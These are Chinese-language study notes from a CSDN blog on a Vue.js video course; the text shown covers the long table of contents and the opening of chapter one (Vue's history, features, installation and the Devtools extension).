## 尚硅谷 Vue全家桶笔记

学习视频：[尚硅谷Vue2.0+Vue3.0全套教程丨vuejs从入门到精通](https://www.bilibili.com/video/BV1Zy4y1K7SH?p=2&spm_id_from=pageDriver)

hello！点进来记得点赞收藏别迷路啦~  
因为内容实在是太多了，我的笔记还在整理上传阶段，等完全完成一定不会让你失望，全网最详细版本，机不可失，失不再来啊

#### 文章目录

- [尚硅谷 Vue全家桶笔记](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_Vue_0)
- [第 1 章：Vue 核心](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_1_Vue__8)
- - [1.1. Vue 简介](https://blog.csdn.net/kkkyyy0817/article/details/139545036#11__Vue__10)
    - - [1.1.1. 官网](https://blog.csdn.net/kkkyyy0817/article/details/139545036#111___12)
        - [1.1.2. 介绍与描述](https://blog.csdn.net/kkkyyy0817/article/details/139545036#112___23)
        - - [1. 什么是vue?](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1_vue_25)
            - [2. 谁开发的？](https://blog.csdn.net/kkkyyy0817/article/details/139545036#2__36)
            - [3. 发展（了解）](https://blog.csdn.net/kkkyyy0817/article/details/139545036#3__40)
        - [1.1.3. Vue 的特点](https://blog.csdn.net/kkkyyy0817/article/details/139545036#113__Vue__64)
        - [学习vue需要的前置知识](https://blog.csdn.net/kkkyyy0817/article/details/139545036#vue_114)
        - [1.1.4. 与其它 JS 框架的关联](https://blog.csdn.net/kkkyyy0817/article/details/139545036#114___JS__127)
        - [1.1.5. Vue 周边库](https://blog.csdn.net/kkkyyy0817/article/details/139545036#115__Vue__135)
    - [1.2. 初识 Vue](https://blog.csdn.net/kkkyyy0817/article/details/139545036#12___Vue_152)
    - - [1. 安装:（三种方式）](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1__154)
        - [2. Vue开发者的必备工具：**Vue Devtools**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#2_VueVue_Devtools_192)
        - [3. 第一个Vue程序](https://blog.csdn.net/kkkyyy0817/article/details/139545036#3_Vue_231)
        - - [注意：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_268)
            - [⭐**el 与 data 的两种写法**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#el__data__343)
            - - [**① el 的第二种写法**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#__el__363)
                - [**② data 的第二种写法**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#__data__410)
    - [记：Vue ---VSCode插件](https://blog.csdn.net/kkkyyy0817/article/details/139545036#Vue_VSCode_478)
    - [**1.3.** **模板语法**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#13___484)
    - - [1.3.1. 效果](https://blog.csdn.net/kkkyyy0817/article/details/139545036#131___486)
        - [**1.3.2.** **模板的理解**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#132___540)
        - [1.3.3. 插值语法](https://blog.csdn.net/kkkyyy0817/article/details/139545036#133___550)
        - [1.3.4. 指令语法](https://blog.csdn.net/kkkyyy0817/article/details/139545036#134___574)
    - [1.4. 数据绑定](https://blog.csdn.net/kkkyyy0817/article/details/139545036#14___609)
    - - [1.4.1. 效果](https://blog.csdn.net/kkkyyy0817/article/details/139545036#141___611)
        - [**1.4.2.** **单向数据绑定**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#142___662)
        - [1.4.3. 双向数据绑定](https://blog.csdn.net/kkkyyy0817/article/details/139545036#143___670)
    - [1.5. MVVM 模型](https://blog.csdn.net/kkkyyy0817/article/details/139545036#15__MVVM__736)
    - - - [数据代理](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_792)
            - - [① 给添加属性](https://blog.csdn.net/kkkyyy0817/article/details/139545036#__798)
                - [② 配置项--获取对象属性](https://blog.csdn.net/kkkyyy0817/article/details/139545036#__839)
                - [③ 配置项--修改对象属性](https://blog.csdn.net/kkkyyy0817/article/details/139545036#__877)
                - [④ 配置项--删除对象属性](https://blog.csdn.net/kkkyyy0817/article/details/139545036#___895)
                - [⑤ 对象属性引用问题](https://blog.csdn.net/kkkyyy0817/article/details/139545036#__927)
        - [什么是数据代理](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_971)
        - [Vue中的数据代理](https://blog.csdn.net/kkkyyy0817/article/details/139545036#Vue_1000)
        - [数据代理的好处](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_1045)
        - [基本原理](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_1053)
    - [1.6. 事件处理](https://blog.csdn.net/kkkyyy0817/article/details/139545036#16___1060)
    - - [1.6.1. 效果](https://blog.csdn.net/kkkyyy0817/article/details/139545036#161___1062)
        - [**1.6.2.** **绑定监听**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#162___1118)
        - [1.6.3. 事件修饰符](https://blog.csdn.net/kkkyyy0817/article/details/139545036#163___1132)
        - [1.6.4. 按键修饰符](https://blog.csdn.net/kkkyyy0817/article/details/139545036#164___1279)
    - [1.7. 计算属性与监视](https://blog.csdn.net/kkkyyy0817/article/details/139545036#17___1351)
    - - [1.7.1. 效果](https://blog.csdn.net/kkkyyy0817/article/details/139545036#171___1353)
        - [**1.7.2.** **计算属性-computed**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#172__computed_1445)
        - [1.7.3. 监视属性-watch](https://blog.csdn.net/kkkyyy0817/article/details/139545036#173__watch_1455)
        - [1.7.4. 深度监视--deep](https://blog.csdn.net/kkkyyy0817/article/details/139545036#174_deep_1565)
        - [1.7.5. 监视的完整写法与简写](https://blog.csdn.net/kkkyyy0817/article/details/139545036#175__1644)
        - [复写案例](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_1701)
        - [计算属性与监视的选择](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_1743)
    - [1.8. class 与 style 绑定](https://blog.csdn.net/kkkyyy0817/article/details/139545036#18__class__style__1819)
    - - [1.8.1. 理解](https://blog.csdn.net/kkkyyy0817/article/details/139545036#181___1923)
        - [1.8.2. class 绑定](https://blog.csdn.net/kkkyyy0817/article/details/139545036#182__class__1931)
        - [1.8.3. style 绑定](https://blog.csdn.net/kkkyyy0817/article/details/139545036#183__style__1943)
    - [1.9. 条件渲染](https://blog.csdn.net/kkkyyy0817/article/details/139545036#19___1951)
    - - [1.9.1. 条件渲染指令](https://blog.csdn.net/kkkyyy0817/article/details/139545036#191___1989)
        - [1.9.2. 比较v-if 与v-show](https://blog.csdn.net/kkkyyy0817/article/details/139545036#192__vif_vshow_2001)
        - [1.9.3. template](https://blog.csdn.net/kkkyyy0817/article/details/139545036#193_template_2023)
        - - [基本用法：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_2063)
    - [1.10. 列表渲染](https://blog.csdn.net/kkkyyy0817/article/details/139545036#110___2074)
    - - [1.10.1. 效果](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1101___2076)
        - [**1.10.2.** **列表显示指令**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1102___2167)
        - [**1.10.3.** **key的作用与原理**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1103__key_2181)
        - [列表过滤](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_2247)
        - [拓展：折叠代码块](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_2325)
        - [列表排序](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_2331)
        - [Vue数据监视](https://blog.csdn.net/kkkyyy0817/article/details/139545036#Vue_2419)
        - - [案例](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_2421)
            - [原理](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_2476)
            - - [1. Vue如何检测对象数据的改变](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1_Vue_2478)
                - [2. Vue如何检测数组数据的改变](https://blog.csdn.net/kkkyyy0817/article/details/139545036#2_Vue_2581)
    - [1.11. 收集表单数据](https://blog.csdn.net/kkkyyy0817/article/details/139545036#111___2591)
    - [**1.12.** **过滤器**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#112___2677)
    - - [1.12.1. 效果](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1121___2683)
        - [**1.12.2.** **理解过滤器**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1122___2756)
    - [1.13. 内置指令与自定义指令](https://blog.csdn.net/kkkyyy0817/article/details/139545036#113___2766)
    - - [常用内置指令](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_2768)
        - [安全性问题cookie：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#cookie_2839)
        - [提高用户体验的细节优化--JS阻塞](https://blog.csdn.net/kkkyyy0817/article/details/139545036#JS_2900)
        - [v-once 指令](https://blog.csdn.net/kkkyyy0817/article/details/139545036#vonce__3015)
        - [v-pre 指令](https://blog.csdn.net/kkkyyy0817/article/details/139545036#vpre__3060)
        - [1.13.1. 自定义指令](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1131___3113)
        - - [自定义指令创建案例](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_3115)
            - - [1. 注册全局指令](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1____3368)
                - [2. 注册局部指令](https://blog.csdn.net/kkkyyy0817/article/details/139545036#2____3376)
                - [3. 配置对象中常用的3个回调](https://blog.csdn.net/kkkyyy0817/article/details/139545036#3_3_3390)
    - [1.14. Vue 实例生命周期](https://blog.csdn.net/kkkyyy0817/article/details/139545036#114__Vue__3400)
    - - [**1.14.1.** **效果**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1141___3402)
        - - - [生命周期：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_3479)
        - [**1.14.2.** **生命周期流程图**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1142___3488)
        - - [1. 挂载流程：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1__3587)
            - [2.更新流程：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#2_3608)
            - [3.销毁流程：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#3_3614)
        - [debugger](https://blog.csdn.net/kkkyyy0817/article/details/139545036#debugger_3622)
        - [**1.14.3.** **vue** **生命周期分析**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1143__vue__3632)
        - [1.14.4. 常用的生命周期方法](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1144___3664)
- [第 2 章：Vue 组件化编程](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_2_Vue__3674)
- - [2.1 模块与组件、模块化与组件化](https://blog.csdn.net/kkkyyy0817/article/details/139545036#21_____3678)
    - - [2.1.1. 模块](https://blog.csdn.net/kkkyyy0817/article/details/139545036#211___3687)
        - [2.1.2. 组件](https://blog.csdn.net/kkkyyy0817/article/details/139545036#212___3697)
        - [2.1.3. 模块化](https://blog.csdn.net/kkkyyy0817/article/details/139545036#213___3707)
        - [2.1.4. 组件化](https://blog.csdn.net/kkkyyy0817/article/details/139545036#214___3713)
    - [2.2. 非单文件组件](https://blog.csdn.net/kkkyyy0817/article/details/139545036#22___3719)
    - - [**⭐Vue中使用组件的三大步骤:**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#Vue_3899)
        - - [一、如何定义一个组件?](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_3907)
            - [二、如何注册组件?](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_3937)
            - [三、编写组件标签:](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_3964)
            - [五、几个注意点：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_3976)
        - [VueComponent](https://blog.csdn.net/kkkyyy0817/article/details/139545036#VueComponent_4362)
        - [一个重要的内置关系](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_4556)
    - [2.3. 单文件组件](https://blog.csdn.net/kkkyyy0817/article/details/139545036#23___4614)
    - - [2.3.1. 一个.vue 文件的组成(3 个部分)](https://blog.csdn.net/kkkyyy0817/article/details/139545036#231__vue_3__4620)
        - - [1. 模板页面](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1____4641)
            - [2. JS 模块对象](https://blog.csdn.net/kkkyyy0817/article/details/139545036#2___JS__4651)
            - - [ES6模块化 暴露方式](https://blog.csdn.net/kkkyyy0817/article/details/139545036#ES6__4666)
            - [3. 样式](https://blog.csdn.net/kkkyyy0817/article/details/139545036#3____4717)
        - [2.3.2. 基本使用](https://blog.csdn.net/kkkyyy0817/article/details/139545036#232___4727)
        - - [案例全过程：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_4735)
- [第 3 章：使用 Vue 脚手架](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_3__Vue__4912)
- - [3.1 初始化脚手架](https://blog.csdn.net/kkkyyy0817/article/details/139545036#31_____4916)
    - - [3.1.1 说明](https://blog.csdn.net/kkkyyy0817/article/details/139545036#311__4920)
        - [3.1.2 具体步骤](https://blog.csdn.net/kkkyyy0817/article/details/139545036#312__4930)
        - [**3.1.3** **模板项目的结构**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#313___5000)
        - - [Vue 脚手架项目的运行流程：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#Vue__5057)
            - [main.js代码讲解--render 函数](https://blog.csdn.net/kkkyyy0817/article/details/139545036#mainjsrender__5076)
            - [修改默认配置](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_5147)
    - [3.2 ref 与 props](https://blog.csdn.net/kkkyyy0817/article/details/139545036#32_ref__props_5199)
    - - [一、**ref**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#ref_5201)
        - [二、props](https://blog.csdn.net/kkkyyy0817/article/details/139545036#props_5279)
    - [3.3 混入 -- mixin](https://blog.csdn.net/kkkyyy0817/article/details/139545036#33______mixin_5408)
    - [3.4 插件 -- plugin](https://blog.csdn.net/kkkyyy0817/article/details/139545036#34______plugin_5525)
    - [scoped 样式](https://blog.csdn.net/kkkyyy0817/article/details/139545036#scoped__5681)
    - [3.5 Todo-list 案例](https://blog.csdn.net/kkkyyy0817/article/details/139545036#35____Todolist__5852)
    - - [工作情景：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_5854)
        - [组件化编码流程（通用）](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_5866)
        - [案例完成过程](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_5880)
        - - [1. 分析布局 分组件](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1___5882)
            - [2. 书写静态页面](https://blog.csdn.net/kkkyyy0817/article/details/139545036#2__5887)
            - - [①. index.html](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_indexhtml_5891)
                - [②. index.css](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_indexcss_5942)
            - [3. 组件拆分](https://blog.csdn.net/kkkyyy0817/article/details/139545036#3__6084)
            - - [App.vue：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#Appvue_6086)
                - [MyHeader.vue：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#MyHeadervue_6165)
                - [MyList.vue：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#MyListvue_6199)
                - [MyItem.vue：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#MyItemvue_6237)
                - [MyFooter.vue：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#MyFootervue_6295)
            - [4. 展示动态数组](https://blog.csdn.net/kkkyyy0817/article/details/139545036#4__6346)
            - [nanoid](https://blog.csdn.net/kkkyyy0817/article/details/139545036#nanoid_6359)
        - [总结TodoList案例](https://blog.csdn.net/kkkyyy0817/article/details/139545036#TodoList_6383)
    - [webStorage【浏览器本地存储】](https://blog.csdn.net/kkkyyy0817/article/details/139545036#webStorage_6405)
    - - [1. localStorage](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1_localStorage_6409)
        - [2. sessionStorage：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#2_sessionStorage_6474)
    - [3.6 Vue 中的自定义事件](https://blog.csdn.net/kkkyyy0817/article/details/139545036#36____Vue__6556)
    - [3.7 全局事件总线](https://blog.csdn.net/kkkyyy0817/article/details/139545036#37_____6602)
    - - [3.7.1 理解](https://blog.csdn.net/kkkyyy0817/article/details/139545036#371___6606)
    - [3.8 消息订阅与发布](https://blog.csdn.net/kkkyyy0817/article/details/139545036#38_____6614)
    - - [3.8.1 理解](https://blog.csdn.net/kkkyyy0817/article/details/139545036#381_______6618)
        - [3.8.2 使用PubSubJS](https://blog.csdn.net/kkkyyy0817/article/details/139545036#382______PubSubJS_6624)
    - [3.9 过渡与动画](https://blog.csdn.net/kkkyyy0817/article/details/139545036#39_____6644)
    - - [3.9.1 效果](https://blog.csdn.net/kkkyyy0817/article/details/139545036#391_______6650)
        - [基本过渡动画的编码](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_6783)
- [第 4 章：Vue 中的 ajax](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_4_Vue__ajax_6803)
- - [4.1 解决开发环境 Ajax 跨域问题](https://blog.csdn.net/kkkyyy0817/article/details/139545036#41___Ajax__6807)
    - [4.3 vue 项目中常用的 2 个 Ajax 库](https://blog.csdn.net/kkkyyy0817/article/details/139545036#43__vue__2__Ajax__6837)
    - - [4.3.1 axios](https://blog.csdn.net/kkkyyy0817/article/details/139545036#431__axios_6841)
        - [4.3.2 vue-resource](https://blog.csdn.net/kkkyyy0817/article/details/139545036#432__vueresource_6851)
    - [4.4 slot 插槽](https://blog.csdn.net/kkkyyy0817/article/details/139545036#44__slot__6901)
    - - [4.4.1 效果](https://blog.csdn.net/kkkyyy0817/article/details/139545036#441___6903)
        - - [效果一（不使用插槽）：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_6905)
            - [效果二（默认插槽）：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_6983)
            - [效果三（具名插槽）：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_7149)
            - [效果四（作用域插槽）：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_7294)
        - [4.4.1 理解](https://blog.csdn.net/kkkyyy0817/article/details/139545036#441___7406)
        - [4.4.2 分类](https://blog.csdn.net/kkkyyy0817/article/details/139545036#442___7413)
- [第 5 章：vuex](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_5_vuex_7423)
- - [5.1 理解 vuex](https://blog.csdn.net/kkkyyy0817/article/details/139545036#51___vuex_7425)
    - - [5.1.1 vuex 是什么](https://blog.csdn.net/kkkyyy0817/article/details/139545036#511__vuex__7427)
        - [5.1.2 什么时候使用 Vuex](https://blog.csdn.net/kkkyyy0817/article/details/139545036#512___Vuex_7435)
        - [**5.1.3** 纯vue求和**案例**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#513__vue_7449)
        - [**5.1.4** **Vuex** **工作原理图**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#514__Vuex__7511)
        - [5.1.5 搭建Vuex环境](https://blog.csdn.net/kkkyyy0817/article/details/139545036#515_Vuex_7522)
        - [5.1.6 vuex求和案例](https://blog.csdn.net/kkkyyy0817/article/details/139545036#516_vuex_7677)
        - [5.1.7 getters配置项](https://blog.csdn.net/kkkyyy0817/article/details/139545036#517_getters_7805)
        - [5.1.8 四个map方法的使用](https://blog.csdn.net/kkkyyy0817/article/details/139545036#518_map_7848)
        - - [mapState 和 mapGetters](https://blog.csdn.net/kkkyyy0817/article/details/139545036#mapState__mapGetters_7850)
            - [**mapActions** 和 **mapMutations**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#mapActions__mapMutations_7936)
        - [5.1.9 多组件共享数据](https://blog.csdn.net/kkkyyy0817/article/details/139545036#519__7996)
        - [5.1.10 vuex模块化](https://blog.csdn.net/kkkyyy0817/article/details/139545036#5110_vuex_8126)
        - - [命名空间（namespaced）](https://blog.csdn.net/kkkyyy0817/article/details/139545036#namespaced_8128)
    - [5.2 vuex 核心概念和 API](https://blog.csdn.net/kkkyyy0817/article/details/139545036#52__vuex__API_8422)
    - - [**5.2.1** **state**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#521__state_8424)
        - [5.2.2 actions](https://blog.csdn.net/kkkyyy0817/article/details/139545036#522__actions_8432)
        - [5.2.3 mutations](https://blog.csdn.net/kkkyyy0817/article/details/139545036#523__mutations_8446)
        - [5.2.4 getters](https://blog.csdn.net/kkkyyy0817/article/details/139545036#524__getters_8458)
        - [5.2.5 modules](https://blog.csdn.net/kkkyyy0817/article/details/139545036#525__modules_8467)
- [第 6 章：vue-router](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_6_vuerouter_8479)
- - [6.1 相关理解](https://blog.csdn.net/kkkyyy0817/article/details/139545036#61___8481)
    - - [6.1.1 vue-router 的理解](https://blog.csdn.net/kkkyyy0817/article/details/139545036#611__vuerouter__8486)
        - [6.1.2 对SPA 应用的理解](https://blog.csdn.net/kkkyyy0817/article/details/139545036#612__SPA__8494)
        - [6.1.3 路由的理解](https://blog.csdn.net/kkkyyy0817/article/details/139545036#613___8517)
        - - - [1. 什么是路由?](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1____8519)
                - [2. 路由分类](https://blog.csdn.net/kkkyyy0817/article/details/139545036#2____8525)
    - [6.2 基本路由](https://blog.csdn.net/kkkyyy0817/article/details/139545036#62___8571)
    - - - [1. 创建组件](https://blog.csdn.net/kkkyyy0817/article/details/139545036#1__8573)
            - [2. 设置路由](https://blog.csdn.net/kkkyyy0817/article/details/139545036#2__8613)
            - [3. 创建根组件](https://blog.csdn.net/kkkyyy0817/article/details/139545036#3__8643)
            - [4. 启动应用](https://blog.csdn.net/kkkyyy0817/article/details/139545036#4__8676)
            - [页面展示：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_8691)
            - [注意事项：](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_8696)
    - [**6.3** **嵌套（多级）路由**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#63___8731)
    - [**6.4** **路由传参**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#64___8773)
    - - [query参数](https://blog.csdn.net/kkkyyy0817/article/details/139545036#query_8775)
        - [params参数](https://blog.csdn.net/kkkyyy0817/article/details/139545036#params_9050)
        - [props配置](https://blog.csdn.net/kkkyyy0817/article/details/139545036#props_9166)
    - [6.5 命名路由](https://blog.csdn.net/kkkyyy0817/article/details/139545036#65__9297)
    - [**6.6** **编程式路由导航⭐**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#66___9350)
    - [6.7 缓存路由组件](https://blog.csdn.net/kkkyyy0817/article/details/139545036#67__9409)
    - [6.8 activated和deactivated](https://blog.csdn.net/kkkyyy0817/article/details/139545036#68_activateddeactivated_9479)
    - [6.9 路由守卫](https://blog.csdn.net/kkkyyy0817/article/details/139545036#69__9525)
    - [6.10 路由器的两种工作模式](https://blog.csdn.net/kkkyyy0817/article/details/139545036#610__9589)
- [第 7 章：Vue UI 组件库](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_7_Vue_UI__9608)
- - - [7.1 移动端常用UI 组件库](https://blog.csdn.net/kkkyyy0817/article/details/139545036#71__UI__9610)
        - [7.2 PC 端常用UI 组件库](https://blog.csdn.net/kkkyyy0817/article/details/139545036#72__PC_UI__9618)
        - [7.3 element-ui基本使用](https://blog.csdn.net/kkkyyy0817/article/details/139545036#73_elementui_9626)
        - [7.4 element-ui按需引入](https://blog.csdn.net/kkkyyy0817/article/details/139545036#74_elementui_9679)
    - [6.5 命名路由](https://blog.csdn.net/kkkyyy0817/article/details/139545036#65__9827)
    - [**6.6** **编程式路由导航⭐**](https://blog.csdn.net/kkkyyy0817/article/details/139545036#66___9880)
    - [6.7 缓存路由组件](https://blog.csdn.net/kkkyyy0817/article/details/139545036#67__9939)
    - [6.8 activated和deactivated](https://blog.csdn.net/kkkyyy0817/article/details/139545036#68_activateddeactivated_10009)
    - [6.9 路由守卫](https://blog.csdn.net/kkkyyy0817/article/details/139545036#69__10055)
    - [6.10 路由器的两种工作模式](https://blog.csdn.net/kkkyyy0817/article/details/139545036#610__10119)
- [第 7 章：Vue UI 组件库](https://blog.csdn.net/kkkyyy0817/article/details/139545036#_7_Vue_UI__10138)
- - - [7.1 移动端常用UI 组件库](https://blog.csdn.net/kkkyyy0817/article/details/139545036#71__UI__10140)
        - [7.2 PC 端常用UI 组件库](https://blog.csdn.net/kkkyyy0817/article/details/139545036#72__PC_UI__10148)
        - [7.3 element-ui基本使用](https://blog.csdn.net/kkkyyy0817/article/details/139545036#73_elementui_10156)
        - [7.4 element-ui按需引入](https://blog.csdn.net/kkkyyy0817/article/details/139545036#74_elementui_10209)

## 第 1 章：Vue 核心

### 1.1. Vue 简介

#### 1.1.1. 官网

1. 英文官网: https://vuejs.org/
    
2. 中文官网: https://cn.vuejs.org/
    

vue2：[Vue.js (vuejs.org)](https://v2.cn.vuejs.org/)

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/298a504a2b16d6721287547eae02af14.png#pic_center)

#### 1.1.2. 介绍与描述

##### 1. 什么是vue?

[**Vue**.js - 渐进式 JavaScript 框架 | **Vue**.js](https://cn.vuejs.org/)

==一套用于**构建用户界面**的**渐进式**Javascript **框架**==

> **【渐进式的理解】：**Vue可以**自底向上**逐层的应用
> 
> - 简单应用：只需一个轻量小巧的核心库
> - 复杂应用：可以引入各式各样的Vue插件

##### 2. 谁开发的？

**作者: ==尤雨溪==**

##### 3. 发展（了解）

> 以下是Vue.js的历史时间线整理：
> 
> - 2013年，尤雨溪受到Angular框架的启发，开始开发一款名为Seed的轻量级前端框架。
>     
>     同年12月，Seed更名为Vue，并发布了版本0.6.0
>     
> - 2014年，Vue正式对外发布，版本号0.8.0
>     
>     Taylor otwell 在 Twitter上发表动态，说自己正在学习Vue.js
>     
> - 2015年，10月27日，正式发布Vue1.0.0Evangelion(新世纪福音战士)
>     
> - 2016年，10月1日，正式发布Vue 2.0.0 Ghostin the Shell(攻壳机动队)
>     
> - 2020年，9月18日，正式发布Vue 3.0.00ne Piece(海贼王)
>     
> 
> ……

后起之秀，生态完善，已然成为国内**前端工程师必备技能**

#### 1.1.3. Vue 的特点

1. 采用**组件化**模式，提高[代码复用](https://edu.csdn.net/cloud/sd_summit?utm_source=glcblog&spm=1001.2101.3001.7020)率、且让代码更好维护
    
2. **声明式**编码，让编码人员无需直接操作DOM，提高开发效率
    
    - 命令式编码
    
    ```html
    <ul id="list"></ul>
    
    <script>
        // 准备html字符串
        let htmlStr = '';
    
        // 遍历数据拼接html字符串
        persons.forEach(function(p) {
            htmlStr += `<li>${p.id}-${p.name}-${p.age}</li>`;
        });
    
        // 获取list元素
        let list = document.getElementById('list');
    
        // 修改内容(亲自操作DOM)
        list.innerHTML = htmlStr;
    </script>
    ```
    
    - 声明式编码
    
    ```html
    <ul id="list">
      <li v-for="p in persons">{{ p.id }}-{{ p.name }}-{{ p.age }}</li>
    </ul>
    ```
    
3. 使用虚拟DOM+优秀的Diff 算法，尽量复用DOM节点
    
    > 1. 它先在内存里想好网页应该看起来怎么样（虚拟DOM）。
    > 2. 然后它看看实际的网页，找出需要改变的地方。
    > 3. 它只更新那些不一样的地方，不需要改变的地方就不动。
    > 
    > 这个找出不同之处的过程叫做Diff算法。
    > 
    > 因为Vue.js只更新变了的地方，所以网页的更新变得很快
    

#### 学习vue需要的前置知识

- ES6语法规范
- ES6模块化
- 包管理器
- ⭐原型、原型链
- 数组常用方法
- axios
- promise
- ……

#### 1.1.4. 与其它 JS 框架的关联

1. 借鉴Angular 的**模板**和**数据绑定**技术
    
2. 借鉴React 的**组件化**和**虚拟DOM** 技术
    

#### 1.1.5. Vue 周边库

1. vue-cli: vue 脚手架
    
2. vue-resource
    
3. axios
    
4. vue-router: 路由
    
5. vuex: 状态管理
    
6. element-ui: 基于vue 的UI 组件库(PC 端)
    
7. ……
    

### 1.2. 初识 Vue

#### 1. 安装:（三种方式）

- 直接下载并用 `<script>` 标签引入，`Vue` 会被注册为一个全局变量
    
    - 开发版本： https://v2.cn.vuejs.org/js/vue.js （**【学习推荐使用】**包含完整的警告和调试模式）
        
    - 生产版本：https://v2.cn.vuejs.org/js/vue.min.js （准备将应用程序部署到生产环境的压缩版 可以减少文件大小并提高加载速度）
        
- 使用CDN方法
    
    - 开发环境
        
        - **【使用】**最新版本：`<script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>`
    - 生产环境
        
        - 特定版本：`<script src="https://cdn.jsdelivr.net/npm/vue@2.7.16"></script>`
        - 压缩版本：`<script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.min.js"></script>`
    - ES Modules可以这样引入：
        
        ```html
        <script type="module">
          import Vue from 'https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.esm.browser.js'
        </script>
        ```
        
- [NPM](https://edu.csdn.net/cloud/sd_summit?utm_source=glcblog&spm=1001.2101.3001.7020)方法
    
    在用 Vue 构建大型应用时推荐使用 NPM 安装。
    
    NPM 能很好地和诸如**webpack 或 Browserify** 模块打包器配合使用。同时 Vue 也提供配套工具来开发**单文件组件**
    
    ```cmd
    # 最新稳定版
    $ npm install vue@^2
    ```
    

#### 2. Vue开发者的必备工具：**Vue Devtools**

这是一个浏览器扩展，可以帮助你调试Vue.js应用程序，它提供了组件的层次结构、状态追踪、性能分析等功能

可以在**GitHub**上找到并安装或者在**浏览器扩展管理**中找到下载

- GitHub：[GitHub - vuejs/devtools: ⚙️ Browser devtools extension for debugging Vue.js applications.](https://github.com/vuejs/devtools#vue-devtools)
    
- 引用**开发版本**的Vue的CDN文件的时候，**控制台**总会**提示**：（不影响但烦人）
    
    > ​ You are running Vue in development mode.  
    > Make sure to turn on production mode when deploying for production.  
    > See more tips at https://vuejs.org/guide/deployment.html
    > 
